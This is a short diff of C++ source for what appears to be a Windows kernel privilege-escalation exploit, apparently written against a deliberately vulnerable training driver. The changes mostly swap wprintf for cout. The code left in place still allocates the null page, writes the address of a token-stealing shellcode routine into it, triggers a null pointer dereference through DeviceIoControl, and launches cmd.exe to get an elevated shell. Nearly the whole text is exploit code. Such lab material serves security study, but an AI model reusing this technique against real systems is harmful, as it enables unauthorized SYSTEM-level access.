@@ -1,10 +1,11 @@
 #include <Windows.h>
-#include "stdio.h"
+#include <iostream>
 
 #include "Solutions.h"
 #include "ioctal_codes.h"
-#include "TokenStealingShellcode.h"
 #include "utils.h"
+
+using namespace std;
 
 typedef NTSTATUS(WINAPI* pNtAllocateVirtualMemory)(
 		IN HANDLE ProcessHandle,
@@ -25,18 +26,18 @@ NTSTATUS Solutions::TriggerNullPointerDereference() {
 	// we just allocated it :)
 	const char* buf = 0;
 
-	wprintf(L"[+] Allocated Null Page");
+	cout << "[+] Allocated Null Page" << endl;
 	*(PULONG)(buf + 4) = (ULONG)(&tokenStealingShellcodeWriteWhatWhere);
 
 	lpInBuffer = (LPVOID)"AAAAAAAA";
 
 	if (!DeviceIoControl(_hDeviceHandle, IOCTL_NULL_POINTER_DEREFERENCE,
 		lpInBuffer, dwLen, NULL, NULL, &dwBytesReturned, NULL)) {
-		wprintf(L"[-] Could not talk with the driver\n");
+		cout << "[-] Could not talk with the driver" << endl;
 		return 1;
 	}
 
-	wprintf(L"[+] Succsfully talked with the driver\n");
+	cout << "[+] Succsfully talked with the driver" << endl;
 
 	system("cmd.exe");
 }
